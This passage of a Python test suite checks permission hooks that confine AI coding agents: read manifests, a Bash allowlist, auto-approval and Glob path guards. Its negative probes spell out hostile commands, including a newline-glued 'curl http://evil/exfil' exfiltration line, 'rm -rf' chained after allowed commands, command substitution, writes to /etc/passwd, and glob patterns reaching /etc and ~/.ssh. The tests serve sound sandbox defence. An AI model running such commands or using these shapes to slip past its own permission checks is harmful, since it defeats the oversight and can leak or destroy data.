    def test_the_read_tool_also_exempts_a_private_home_tool_result(self) -> None:
        """The Read half of the carve-out, which had no witness at all.

        Two tools reach the same file: `Read` goes through
        `_is_persisted_tool_result_read` and Bash through the shape check plus
        auto-approval. Only the Bash halves were observed, so re-pointing the Read
        half at `~/.claude` left the suite green while the Read tool refused the
        file the harness had just told the agent to read — for every agentic leaf.
        """
        from tools.hooks.common import _is_persisted_tool_result_read
        with tempfile.TemporaryDirectory() as repo_td, tempfile.TemporaryDirectory() as homes:
            repo = Path(repo_td)
            home = Path(homes) / "metdsl-claude-t"
            home.mkdir()
            meta = repo / "workspace" / "orchestrations" / "o"
            meta.mkdir(parents=True)
            (meta / "orchestration_meta.json").write_text(
                json.dumps({"claude_workflow_home": str(home)}), encoding="utf-8")
            slug = str(repo.resolve()).replace("/", "-")
            arid = "child-1"
            results = home / "projects" / slug / arid / "tool-results"
            results.mkdir(parents=True)
            target = results / "abc.txt"
            target.write_text("oversized gate output", encoding="utf-8")

            env = {"METFORGE_WORKFLOW_MODE": "1", "METFORGE_ORCHESTRATION_ID": "o"}
            with patch.dict(os.environ, env, clear=False):
                self.assertTrue(_is_persisted_tool_result_read(
                    repo, "substep", arid, str(target)))
                # CONTROL — the exemption is bound to the agent's OWN session, so a
                # sibling leaf's persisted output is not readable through it.
                other = home / "projects" / slug / "child-2" / "tool-results"
                other.mkdir(parents=True)
                (other / "abc.txt").write_text("x", encoding="utf-8")
                self.assertFalse(_is_persisted_tool_result_read(
                    repo, "substep", arid, str(other / "abc.txt")))

    def test_the_bash_read_policy_auto_approves_a_private_home_tool_result(self) -> None:
        """The SECOND Bash call site, through the real hook decision.

        `_is_auto_approvable_readonly_bash` is one of two places the id had to
        reach; `_evaluate_bash_read_manifest_policy` is the other, and it was
        unobserved — the commit that fixed both named both and witnessed one.
        Asserted on the decision the hook actually returns.
        """
        from tools.hooks.cli import _evaluate_bash_read_manifest_policy
        from tools.hooks.common import HookEventName, HookInput
        with tempfile.TemporaryDirectory() as repo_td, tempfile.TemporaryDirectory() as homes:
            repo = Path(repo_td)
            home = Path(homes) / "metdsl-claude-t"
            home.mkdir()
            orch = repo / "workspace" / "orchestrations" / "o"
            (orch / "read_manifests").mkdir(parents=True)
            (orch / "orchestration_meta.json").write_text(
                json.dumps({"claude_workflow_home": str(home)}), encoding="utf-8")
            (orch / "read_manifests" / "child-1.json").write_text(
                json.dumps({"agent_run_id": "child-1", "allowed_read_roots": ["docs/"]}),
                encoding="utf-8")
            slug = str(repo.resolve()).replace("/", "-")
            results = home / "projects" / slug / "child-1" / "tool-results"
            results.mkdir(parents=True)
            target = results / "abc.txt"
            target.write_text("oversized gate output", encoding="utf-8")

            env = {"METFORGE_WORKFLOW_MODE": "1", "METFORGE_ORCHESTRATION_ID": "o"}
            with patch.dict(os.environ, env, clear=False):
                decision, _run_id, out_of_repo = _evaluate_bash_read_manifest_policy(
                    decoded=HookInput(
                        event_name=HookEventName.PRE_COMMAND_EXECUTE, backend="claude",
                        payload={"command": f"cat {target}", "repo_root": str(repo)},
                        command=f"cat {target}", tool_name="Bash"),
                    repo_root=repo, orchestration_id="o", backend="claude",
                    resolved_run_id="child-1")
            # The exemption's job is to keep this target OUT of the out-of-repo set,
            # which is what later costs it the auto-approve; and the manifest grants
            # only `docs/`, so a guard decision here would be the refusal it exempts.
            policy = (getattr(decision, "audit_detail", None) or {}).get("policy", "") \
                if decision is not None else ""
            self.assertNotEqual(policy, "read_manifest_read_guard")
            self.assertNotIn(str(target), out_of_repo)

    def test_committed_allowlist_covers_the_commands_the_repository_instructs(
        self,
    ) -> None:
        """PIN: every command a leaf is TOLD to run is matched by a committed entry.

        Since issue #63's final form the committed `leaf_config/claude/settings.json`
        is an agentic leaf's whole permission layer, so an entry deleted or misspelled costs every leaf an
        interactive approval that cannot be answered — the workflow stalls. Nothing
        read that file after the redirect admission was removed: measured, stripping
        all sixteen `Bash(...)` entries left the entire suite green.

        The gate commands are taken from the RENDERED runbook rather than restated
        here, so a new gate command is covered the day it is emitted. The three
        contract-named routes no runbook renders are listed below, each with the
        document that instructs it.

        SCOPE, measured by deleting each entry in turn: of the sixteen committed
        `Bash(...)` entries this reaches SIX. Three come from the runbook
        (`python3 tools/orchestration_runtime.py *`, `python3 tools/check_artifact_syntax.py *`,
        `python3 tools/validate_workspace_root.py *`) — and only from two of the
        eleven (step, substep) pairs, since the other nine render no runbook at all,
        so "covered the day it is emitted" holds for those two. Three come from the
        listed routes (`python3 workspace/tmp/*`, `python3 tools/new_agent_run_id.py`,
        `cat workspace/orchestrations/*`). The ten it does NOT reach, each verified
        to survive deletion: `python3 tools/run_workflow.py *` (operator-side),
        `python3 tools/validate_pipeline_semantics.py *`,
        `python3 tools/audit_orchestration.py *`, `mkdir -p workspace/tmp/*`,
        `cat workspace/tmp/*`, both `jq -er *` entries, `date -u *`, and the two
        `echo` entries. It does not ask whether the entries are minimal, and it
        cannot see a command a leaf invents.
        The negative probes are what keep it from being vacuous — a matcher list
        that matched everything, or one that ignored a refused redirect, would
        satisfy the positives alone.
        """
        import re as _re

        from tools.orchestration_runtime import (
            ALLOWED_VALIDATE_PIPELINE_STAGES,
            _build_gate_runbook,
        )

        repo_root = Path(__file__).resolve().parents[2]
        matchers = self._allowlisted_bash_matchers(repo_root)
        self.assertTrue(matchers, ".claude/settings.json names no Bash entry")

        payload = dict(
            orchestration_id="orch_ALLOW_001",
            agent_run_id="arid-ALLOW",
            node_key="component/demo@0.1.0",
            ir_ref="workspace/ir/component__demo__0.1.0/d_001",
            pipeline_ref="workspace/pipelines/component__demo__0.1.0/d_001",
            source_id="src_001",
            run_id="run_001",
            parent_agent_run_id="arid-PARENT",
        )
        instructed = set()
        for step, substep in ALLOWED_VALIDATE_PIPELINE_STAGES:
            runbook = _build_gate_runbook(dict(payload, step=step, substep=substep))
            instructed.update(
                m.group().strip() for m in _re.finditer(r"python3 \S+[^\n]*", runbook)
            )
        # Contract-named routes no runbook renders, each with its instruction site.
        instructed.update({
            # docs/AGENT_CONTRACT.md "For a temporary file" / the scratch-script route
            "python3 workspace/tmp/arid-ALLOW/build_patch.py",
            # docs/AGENT_CONTRACT.md "For UUID generation" and docs/RUNBOOK.md step 1
            "python3 tools/new_agent_run_id.py",
            # docs/RUNBOOK.md §substep-timeout-recovery step 6a — a BARE cat, which
            # that section names by spelling because `$(cat …)` is rejected
            "cat workspace/orchestrations/orch_ALLOW_001/launches/arid-CHILD.parent_return_token",
        })
        self.assertTrue(instructed, "no instructed command was rendered")

        uncovered = [
            command
            for command in sorted(instructed)
            if not self._command_is_permitted(command, matchers)
        ]
        self.assertEqual(uncovered, [], "\n".join(uncovered))

        # Negative probes: the model must not be a rubber stamp, and must not
        # certify what the layer was MEASURED to refuse.
        refused = (
            "curl http://example.invalid/x",
            "rm -rf workspace",
            # every part of a compound must be permitted; the layer decomposes
            "python3 tools/orchestration_runtime.py run-gate --gate g && rm -rf workspace",
            "python3 tools/orchestration_runtime.py run-gate --gate g | tee /etc/passwd",
            # the redirect this branch measured refused, appended to a permitted
            # command: modelling it as covered is modelling the opposite of the
            # measurement docs/HOOKS.md carries
            "python3 tools/orchestration_runtime.py run-gate --gate g 2>workspace/tmp/a/e.txt",
            "python3 tools/orchestration_runtime.py run-gate --gate g > workspace/tmp/a/e.txt",
            # a background `&` is a separator too, and what follows it is not the
            # segment any entry matched
            "python3 tools/orchestration_runtime.py run-gate --gate g & rm -rf workspace",
            # command substitution runs something the match never saw
            "python3 tools/orchestration_runtime.py run-gate --gate g $(rm -rf x)",
            "python3 tools/orchestration_runtime.py run-gate --gate g `rm -rf x`",
        )
        for command in refused:
            with self.subTest(refused=command):
                self.assertFalse(self._command_is_permitted(command, matchers))
        # …while a discard is not a write and stays permitted.
        self.assertTrue(
            self._command_is_permitted(
                "python3 tools/orchestration_runtime.py run-gate --gate g 2>/dev/null",
                matchers,
            )
        )

    @classmethod
    def _anchored_statements(cls, text: str, anchor: str, scope: str) -> list[str]:
        """Every statement of the scratch rule in `text`, read at the anchor.

        Shared by the surfaces check and by its self-test, so the WINDOW and the
        row-cell rule are observed rather than reimplemented: mutating
        `_STATEMENT_WINDOW` to 100000 or `_NAMES_THE_ROUTE` to `r""` was measured to
        leave the surfaces check green, because nothing fed it a document whose
        route is named only outside the window.
        """
        statements: list[str] = []
        lines = text.splitlines()
        for n, line in enumerate(lines):
            if anchor not in line:
                continue
            if scope == "row":
                cells = [c for c in line.split("|") if c.strip()]
                statements.append(cells[-1])
                continue
            # Join the next line first: a reflow that ends the line at the anchor
            # would otherwise read an empty statement.
            joined = " ".join([line] + lines[n + 1 : n + 2])
            i = joined.index(anchor)
            statements.append(joined[i : i + cls._STATEMENT_WINDOW])
        return statements

    def test_scratch_route_statement_reader_is_bounded_and_names_the_route(
        self,
    ) -> None:
        """SELF-TEST for the check below, whose two knobs had no witness.

        The window is what makes the check read THIS rule's sentence rather than the
        artifact-write sentence that follows it on the same line and names the same
        tool. Without a fixture whose route is named just outside the window, the
        window could be widened to the whole file and nothing would notice.
        """
        anchor = "For a temporary file"
        near = f"{anchor}, write it with the `Write` tool to that literal path."
        far = f"{anchor}, put it under allowed_tmp_root." + " padding" * 40 + " Write tool."
        self.assertTrue(
            all(
                self._NAMES_THE_ROUTE.search(s)
                for s in self._anchored_statements(near, anchor, "sentence")
            )
        )
        self.assertFalse(
            any(
                self._NAMES_THE_ROUTE.search(s)
                for s in self._anchored_statements(far, anchor, "sentence")
            ),
            "the statement window is wide enough to read a later sentence's route",
        )
        # The row scope reads the remedy cell, not the whole row.
        row = "| `output_manifest_write_guard` | wrote /tmp | use the `Write` tool |"
        self.assertEqual(
            self._anchored_statements(row, "output_manifest_write_guard", "row"),
            [" use the `Write` tool "],
        )

    # The five surfaces that state the redirect rule for a leaf. Not derived from
    # `_SCRATCH_SURFACES`: `skills/workflow-audit-claude/SKILL.md` and
    # `docs/WORKSPACE_LAYOUT.md` are in that list for the scratch-route statement
    # and say nothing about redirects.
    _REDIRECT_RULE_SURFACES = (
        "docs/AGENT_CONTRACT.md",
        "docs/RUNBOOK.md",
        "docs/workflow/LAUNCH_PROMPT_REFERENCE.md",
        "tools/prompt_templates/step_agent.txt",
        "tools/prompt_templates/substep_agent.txt",
    )

    # The general form of the rule. Pinned as a PHRASE because the property is a
    # sentence's scope, which no pattern over commands can reach: the retired
    # wording ("a Bash redirect that is itself the command matches no committed
    # permissions.allow rule") carries no redirect span at all, so the offender
    # scan cannot see it, and reverting either prompt template — the text every
    # leaf receives — was measured to leave the whole suite green.
    _STATES_THE_GENERAL_RULE = re.compile(r"not a (?:write|scratch-write) route in any position", re.I)

    @classmethod
    def _narrow_clause_alone(cls, text: str) -> list[str]:
        """Paragraphs that name the whole-command case without the general rule.

        A file-wide phrase match cannot see this: the general clause in paragraph
        one satisfies it while paragraph nine reintroduces the narrow premise.
        Shared with the self-test, because with every real surface satisfying it
        today the rule has no witness in the tree — disabling it was measured to
        change nothing.
        """
        return [
            unit[:200]
            for unit in cls._statement_units(text)
            if re.search(r"itself the command|the whole command", unit)
            and not cls._STATES_THE_GENERAL_RULE.search(unit)
        ]

    @staticmethod
    def _statement_units(text: str) -> list[str]:
        """Split into units a reader would take as one statement.

        A blank line is not the boundary on these surfaces: a consecutive bullet
        list or a table is ONE `\n\n`-paragraph — measured 9637 characters in
        docs/AGENT_CONTRACT.md, 6952 in docs/RUNBOOK.md, 2335 in
        docs/workflow/LAUNCH_PROMPT_REFERENCE.md — so splitting on it collapsed the
        per-statement rule into the file-wide check that the caller's docstring
        says is insufficient. Demonstrated: the retired premise placed in a
        DIFFERENT row of the docs/RUNBOOK.md remedy table, with the general clause
        left in its own row, passed. A list item and a table row each start a
        statement of their own.
        """
        units: list[str] = []
        current: list[str] = []
        for line in text.splitlines():
            starts_item = bool(re.match(r"\s*(?:[-*+]\s|\d+[.)]\s|\||#)", line))
            if not line.strip() or starts_item:
                if current:
                    units.append("\n".join(current))
                current = []
            if line.strip():
                current.append(line)
        if current:
            units.append("\n".join(current))
        return units

    def test_narrow_clause_alone_is_detected_per_paragraph(self) -> None:
        """SELF-TEST for the paragraph rule, which no real surface exercises."""
        good = (
            "A Bash redirect is not a write route in any position, as the whole "
            "command or appended.\n\nUnrelated paragraph."
        )
        bad = (
            "A Bash redirect is not a write route in any position.\n\n"
            "A redirect that is itself the command matches no committed rule."
        )
        self.assertEqual(self._narrow_clause_alone(good), [])
        self.assertEqual(len(self._narrow_clause_alone(bad)), 1)
        # A markdown list or table is ONE blank-line paragraph, so the boundary
        # that matters is the item, not the blank line: with a `\n\n` split the
        # premise below hides behind the general clause in the row above it.
        table = (
            "| `output_manifest_write_guard` | wrote /tmp | a Bash redirect is not "
            "a write route in any position |\n"
            "| `forbid_git_reset_hard` | ran it | a redirect that is itself the "
            "command matches no committed rule |\n"
        )
        self.assertEqual(len(self._narrow_clause_alone(table)), 1)
        bullets = (
            "- A Bash redirect is not a write route in any position.\n"
            "- A redirect that is itself the command matches no committed rule.\n"
        )
        self.assertEqual(len(self._narrow_clause_alone(bullets)), 1)

    def test_general_rule_phrase_accepts_the_current_form_and_rejects_the_retired(
        self,
    ) -> None:
        """SELF-TEST for the phrase pin below, which is a positive assertion.

        A positive assertion is green when its pattern matches everything: blanking
        `_STATES_THE_GENERAL_RULE` was measured to leave the surfaces check passing
        even with a prompt template reverted to the retired wording. The pattern is
        therefore fed both forms directly.
        """
        current = (
            "A Bash redirect is not a write route in any position: on the Claude "
            "Code backend the permission layer refuses it."
        )
        retired = (
            "a Bash redirect that is itself the command (`cat > ...`) matches no "
            "committed `permissions.allow` rule and costs an attempt"
        )
        self.assertRegex(current, self._STATES_THE_GENERAL_RULE)
        self.assertNotRegex(retired, self._STATES_THE_GENERAL_RULE)
        # …and the scratch-write spelling the prompt templates use.
        self.assertRegex(
            "not a scratch-write route in any position", self._STATES_THE_GENERAL_RULE
        )

    def test_redirect_rule_surfaces_state_it_in_the_general_form(self) -> None:
        """PIN: every surface that states the redirect rule states it for ANY position.

        The narrow form scopes the refusal to a redirect that IS the command, which
        reads as a licence for a capture appended to a permitted command — the shape
        the permission layer was measured to refuse (docs/HOOKS.md §"Layer
        boundary"). That premise was written in five places, retired in stages, and
        found still standing twice; a phrase pin is what observes it.

        Read WHOLE-FILE rather than at an anchor, deliberately: this phrase appears
        nowhere else in these files, so it cannot be satisfied by a sentence about a
        different rule — the failure the anchored checks in this class exist to
        avoid. The cost is that rewording it costs a test update, which is the point.
        """
        repo_root = Path(__file__).resolve().parents[2]
        # Asserted as a literal, for the reason the sibling check learned the hard
        # way: a loop over an emptied tuple asserts nothing and stays green.
        self.assertEqual(
            set(self._REDIRECT_RULE_SURFACES),
            {
                "docs/AGENT_CONTRACT.md",
                "docs/RUNBOOK.md",
                "docs/workflow/LAUNCH_PROMPT_REFERENCE.md",
                "tools/prompt_templates/step_agent.txt",
                "tools/prompt_templates/substep_agent.txt",
            },
        )
        for rel in self._REDIRECT_RULE_SURFACES:
            with self.subTest(surface=rel):
                text = (repo_root / rel).read_text(encoding="utf-8")
                self.assertRegex(text, self._STATES_THE_GENERAL_RULE)
                # …and the narrow clause never stands alone: where a surface still
                # names the whole-command case (it is true, just not the whole
                # rule), the general clause must be in the same paragraph.
                self.assertEqual(self._narrow_clause_alone(text), [], rel)

    def test_instruction_surfaces_state_the_write_tool_scratch_route(self) -> None:
        """SAMPLE (not a pin): each surface's scratch sentence names the file tool.

        Read the ANCHORED sentence, not the file and not the line's neighbourhood.
        Every one of these surfaces also names the `Write` tool for ARTIFACT writes,
        usually on the same line, so a file-wide or +/-2-line match is satisfied by a
        sentence about a different rule: measured, the whole tmp-area paragraph could
        be replaced with `create it with printf > that literal path` in both prompt
        templates and the earlier version of this test stayed green. This is the same
        defect the WRITE_HINT pin had, and the same instrument fixes it.

        A pointer to docs/AGENT_CONTRACT.md satisfies it as well as a restatement: the
        rule is that a leaf can reach the route from this surface, not that seven
        documents repeat it.

        SCOPE: this asks whether the statement NAMES the route, never what it says
        about it. A sentence reading "do NOT use the `Write` tool, use a heredoc"
        passes, and so does a surface that keeps a pointer while stating a different
        route in prose. Polarity is a semantic property and no version of this check
        reached it; four versions were defeated, each in a new form, which is why the
        limit is written down here instead of being narrowed a fifth time. Rewording
        an anchor fails the check by design — the statement moved, so it should be
        re-read — but that also means ordinary rewording of these seven sentences
        costs a test update.
        """
        repo_root = Path(__file__).resolve().parents[2]
        for rel, anchor, scope in self._SCRATCH_SURFACES:
            with self.subTest(surface=rel):
                path = repo_root / rel
                self.assertTrue(path.is_file(), f"{rel} missing; update the surface list")
                stated = self._anchored_statements(
                    path.read_text(encoding="utf-8"), anchor, scope
                )
                self.assertTrue(
                    stated, f"{rel} no longer states the scratch rule ({anchor!r})"
                )
                # every occurrence, not any: a second statement of the same rule is
                # a second answer to the same question, and the leaf reads whichever
                # one it lands on.
                unrouted = [s for s in stated if not self._NAMES_THE_ROUTE.search(s)]
                self.assertEqual(
                    unrouted,
                    [],
                    f"{rel} states the scratch rule without naming the write route: "
                    + " || ".join(s[:160] for s in unrouted),
                )

    def test_bash_redirect_to_managed_artifact_is_blocked(self) -> None:
        """Phase-2: a Bash command that WRITES (file redirect) to a managed
        artifact is blocked even on a manifest match — shell redirection is never
        an authorized artifact-write path (managed artifacts go through the
        Edit/Write / codex apply_patch tools; Bash may only write scratch under
        allowed_tmp_root). This also guards the auto-approve invariant: a writing
        Bash command is certainly never auto-approved."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_bash_scope_001"
            run_id = "step_run_bash_scope_001"
            target = "workspace/ir/p/spec.ir.yaml"
            self._setup_orchestration_for_write(
                repo_root,
                orch=orch,
                run_id=run_id,
                allowed_output_paths=[target],
                allowed_file_tool_paths=[target],
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Bash",
                "tool_input": {"command": f"cat foo > {target}"},
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METFORGE_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")

    def test_readonly_bash_compound_emits_auto_approve(self) -> None:
        """A-2 increment 1: a provably read-only Bash composition (no write
        targets) is auto-approved end-to-end, emitting permissionDecision=allow
        so the harness's native ;/pipe permission decomposition is bypassed."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_bash_readonly_001"
            run_id = "step_run_bash_readonly_001"
            self._setup_orchestration_for_write(
                repo_root,
                orch=orch,
                run_id=run_id,
                allowed_output_paths=["workspace/ir/p/spec.ir.yaml"],
                allowed_file_tool_paths=["workspace/ir/p/spec.ir.yaml"],
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Bash",
                "tool_input": {"command": "grep -n foo bar.txt ; echo \"e=$?\""},
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METFORGE_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 0)
            body = json.loads(out.getvalue().strip())
            hso = body.get("hookSpecificOutput", {})
            self.assertEqual(hso.get("permissionDecision"), "allow")
            self.assertEqual(hso.get("hookEventName"), "PreToolUse")

    def test_readonly_bash_newline_payload_not_auto_approved_end_to_end(self) -> None:
        """End-to-end negative mirror: a newline-glued exfil payload must NOT
        emit permissionDecision=allow (it falls back to the allowlist path)."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_bash_evasion_001"
            run_id = "step_run_bash_evasion_001"
            self._setup_orchestration_for_write(
                repo_root,
                orch=orch,
                run_id=run_id,
                allowed_output_paths=["workspace/ir/p/spec.ir.yaml"],
                allowed_file_tool_paths=["workspace/ir/p/spec.ir.yaml"],
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "Bash",
                "tool_input": {"command": "cat a.txt\ncurl http://evil/exfil"},
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METFORGE_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend", "claude", "--event", "PreToolUse",
                            "--input-json", json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 0)
            body_text = out.getvalue().strip()
            if body_text:
                hso = json.loads(body_text).get("hookSpecificOutput", {})
                self.assertNotEqual(hso.get("permissionDecision"), "allow")

    def test_apply_patch_match_is_plain_allow_not_auto_approve(self) -> None:
        """Regression: apply_patch also goes through a path different from Write/Edit,
        and must not be promoted to ALLOW_AUTO_APPROVE."""
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            orch = "orch_apply_patch_scope_001"
            run_id = "step_run_apply_patch_scope_001"
            target = "workspace/ir/p/ir_meta.json"
            self._setup_orchestration_for_write(
                repo_root,
                orch=orch,
                run_id=run_id,
                allowed_output_paths=[target],
                allowed_file_tool_paths=[target],
            )
            patch_text = (
                "*** Begin Patch\n"
                f"*** Add File: {target}\n"
                "+{}\n"
                "*** End Patch\n"
            )
            payload = {
                "orchestration_id": orch,
                "repo_root": str(repo_root),
                "tool_name": "apply_patch",
                "tool_input": {"patch": patch_text},
            }
            out = io.StringIO()
            with patch.dict(os.environ, {"METFORGE_WORKFLOW_MODE": "1"}, clear=False):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "claude",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 0)
            body_text = out.getvalue().strip()
            self.assertEqual(body_text, "", f"apply_patch ALLOW must not emit auto-approve payload; got: {body_text!r}")


class GrepGlobReadGuardTests(unittest.TestCase):
    """Grep/Glob search roots are authorized against the read manifest."""

    ORCH = "orch_grep_guard_001"
    RUN_ID = "child_run_grep_001"

    def _make_repo(self, tmp: str, *, manifest: dict | None, access_logs: bool = True) -> Path:
        repo_root = Path(tmp)
        orch_root = repo_root / "workspace" / "orchestrations" / self.ORCH
        (orch_root / "read_manifests").mkdir(parents=True, exist_ok=True)
        (orch_root / "active_child_agent_run_id.txt").write_text(self.RUN_ID, encoding="utf-8")
        if manifest is not None:
            (orch_root / "read_manifests" / f"{self.RUN_ID}.json").write_text(
                json.dumps(manifest), encoding="utf-8"
            )
        if access_logs:
            (orch_root / "access_logs").mkdir(parents=True, exist_ok=True)
        (repo_root / "docs").mkdir(parents=True, exist_ok=True)
        return repo_root

    def _run(self, repo_root: Path, tool_name: str, tool_input: dict, *, workflow_mode: str = "1"):
        payload = {
            "orchestration_id": self.ORCH,
            "repo_root": str(repo_root),
            "tool_name": tool_name,
            "tool_input": tool_input,
        }
        out = io.StringIO()
        with patch.dict(os.environ, {"METFORGE_WORKFLOW_MODE": workflow_mode}, clear=False):
            with redirect_stdout(out):
                code = cli.main(
                    [
                        "--backend",
                        "claude",
                        "--event",
                        "PreToolUse",
                        "--input-json",
                        json.dumps(payload),
                    ]
                )
        return code, out.getvalue().strip()

    def _log_lines(self, repo_root: Path) -> list[dict]:
        log_path = (
            repo_root
            / "workspace"
            / "orchestrations"
            / self.ORCH
            / "access_logs"
            / f"{self.RUN_ID}.jsonl"
        )
        if not log_path.is_file():
            return []
        return [
            json.loads(line)
            for line in log_path.read_text(encoding="utf-8").splitlines()
            if line.strip()
        ]

    def test_an_absolute_or_tilde_glob_pattern_is_blocked(self) -> None:
        """The trigger: a pattern beginning with `/` — the one shape MEASURED to reach
        outside `path` — or with `~`, which is refused although it is inert.

        The tool asks `path.isAbsolute` of the whole pattern and re-roots the search when
        it is true, ignoring `path`. Driven against the real tool (CLI 2.1.239):
        `/etc/hostname`, `/tmp/<marker>/*`, `//tmp/<marker>/*`, `/tmp/{a,b}/*` and
        `/tmp/x/../x/*` all READ what they name — braces and `..` AFTER the leading slash
        included, which is why the prefix is normalized before it is judged.

        The `~` rows are the deliberate exception, and the refusal text says so rather than
        calling them absolute: measured, `~/.bashrc` reads NOTHING (the tool asks
        `isAbsolute`, which `~` is not). It stays in the trigger because
        `_glob_literal_prefix` already returns the expanded location, so it costs one
        character — not because it is reachable.
        """
        manifest = {"allowed_read_roots": ["docs"]}
        for pattern in ("/etc/*", "//etc/*", "/etc/hostname", "/etc/{a,b}/*",
                        "/etc/x/../*", "/", "~/.ssh/*", "~/*"):
            with self.subTest(pattern), tempfile.TemporaryDirectory() as tmp:
                repo_root = self._make_repo(tmp, manifest=manifest)
                code, body = self._run(
                    repo_root, "Glob", {"path": "docs", "pattern": pattern})
                self.assertEqual(code, 2, f"{pattern} was not blocked: {body}")
                self.assertIn("is authorized at", body)

    def test_when_both_the_path_and_the_pattern_are_ungranted_the_path_is_reported(self) -> None:
        """Precedence when BOTH halves refuse — untested until a reviewer mutated the guard.

        The pattern branch runs only when the `path` verdict is not already a block, so the
        `path` is the reported cause and the audit row names it. That is the right order:
        `path` is what the leaf passed first and what it can fix first, and for an absolute
        pattern the tool ignores `path` anyway, so reporting the pattern would send the
        leaf to change something that was not consulted.
        """
        manifest = {"allowed_read_roots": ["docs"]}
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, manifest=manifest)
            (repo_root / "tools").mkdir(exist_ok=True)
            code, body = self._run(
                repo_root, "Glob", {"path": "tools", "pattern": "/etc/*"})
            row = self._log_lines(repo_root)[-1]
        self.assertEqual(code, 2, body)
        self.assertNotIn("is authorized at", body)
        self.assertEqual(row["path"], "tools")

    def test_an_absolute_pattern_inside_a_granted_root_is_allowed(self) -> None:
        """Absolute is not by itself a refusal — it is judged where it points."""
        manifest = {"allowed_read_roots": ["docs"]}
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = self._make_repo(tmp, manifest=manifest)
            code, body = self._run(
                repo_root, "Glob",
                {"path": "docs", "pattern": f"{repo_root}/docs/**/*.md"})
        self.assertEqual(code, 0, body)

    def test_an_absolute_pattern_is_judged_after_its_dots_are_collapsed(self) -> None:
        """`normpath` before the literal prefix.

        An absolute pattern may carry `..` after its leading slash — measured, the tool
        reads what that resolves to (`/tmp/x/../x/*` returned the file). The VERDICT is the
        same either way, because `validate_read_access` resolves the path itself: measured,
        dropping `normpath` leaves all three of `<repo>/spec/../docs/*` (allow),
        `<repo>/docs/../spec/*` (block) and `<repo>/../../etc/*` (block) unchanged. What it
        changes is the AUDIT ROW, which reads `REPO/docs/../spec` instead of `REPO/spec` —
        the durable record of where a leaf reached, spelled as the leaf spelled it rather
        than as the place. That is what this pins; the verdicts are here as the control
        showing they do not move.
        """
        manifest = {"allowed_read_roots": ["docs"]}
        for suffix, expected, logged in (("/spec/../docs/*", 0, "docs"),
                                         ("/docs/../spec/*", 2, "spec")):
            with self.subTest(suffix), tempfile.TemporaryDirectory() as tmp:
                repo_root = self._make_repo(tmp, manifest=manifest)
                (repo_root / "spec").mkdir(exist_ok=True)
                code, body = self._run(
                    repo_root, "Glob",
                    {"path": "docs", "pattern": f"{repo_root}{suffix}"})
                self.assertEqual(code, expected, f"{suffix}: {body}")
                row = self._log_lines(repo_root)[-1]
                # The judged location on BOTH verdicts now, so the allowed row names
                # `<repo>/docs` rather than the `path` the tool ignored.
                self.assertEqual(row["path"], str(repo_root / logged), f"{suffix}: {row}")

    def test_a_tilde_pattern_is_judged_on_its_expansion(self) -> None:
        """`_glob_literal_prefix`'s third return, which the literal spelling hides.

        `~/.ssh/*`'s literal prefix is `~`, which reads as the IN-REPO path `<repo>/~` —
        granted whenever the manifest grants the root. Only the expanded location shows it
        leaves the repository, so the root is granted here on purpose: with the expansion
        ignored these rows pass.
        """
        manifest = {"allowed_read_roots": ["."]}
        for pattern in ("~/.ssh/*", "~/*"):
            with self.subTest(pattern), tempfile.TemporaryDirectory() as tmp:
                repo_root = self._make_repo(tmp, manifest=manifest)
                code, body = self._run(
                    repo_root, "Glob", {"path": "docs", "pattern": pattern})
                self.assertEqual(code, 2, f"{pattern} was not blocked: {body}")

    def test_a_relative_pattern_is_not_refused_however_it_is_spelled(self) -> None:
        """THE DELETED DEFENCE, kept as its own witness.

        Until round 12 this check normalized every pattern, expanded brace alternatives and
        judged each landing place — machinery that refused `../secret/*`, `{../secret,sub}/*`
        and the rest. All of them are INERT: measured against the real tool in a saturated
        fixture (an `outside/` and a `secret/` holding a marked file at every ancestor a
        pattern could resolve to, so an empty result cannot mean "the target was absent"),
        every one returns "No files found" — including a brace whose absolute alternative is
        not at the start, in both orders, and a symlinked directory and file.

        So these rows assert that the check does NOT refuse them. If a future CLI starts
        resolving `..`, this test is what turns green into a decision: it will still pass,
        and the premise it rests on is re-measurable by
        `.claude/skills/metforge-enforcement-change/scripts/measure_claude_tool.py`. That list asks
        the same SHAPES as the rows below, not the same strings: its absolute alternative
        points into the fixture rather than at `/etc`, so the row is saturated, and it also
        carries `~/…`, which cannot appear here because the hook refuses it. An earlier
        version of this docstring claimed the two lists were the same, and they differed in
        BOTH directions; the harness's own coverage is pinned by
        `tools/tests/test_measure_claude_tool.py` instead of asserted here in prose.
        """
        manifest = {"allowed_read_roots": ["docs"]}
        for pattern in ("../secret/*", "../../secret/*", "../../../secret/*",
                        "*/../../secret/*", "{../secret,sub}/*", "{sub,/etc}/*",
                        "{/etc,sub}/*", "sub/../../secret/*", " /etc/*", "\t/etc/*",
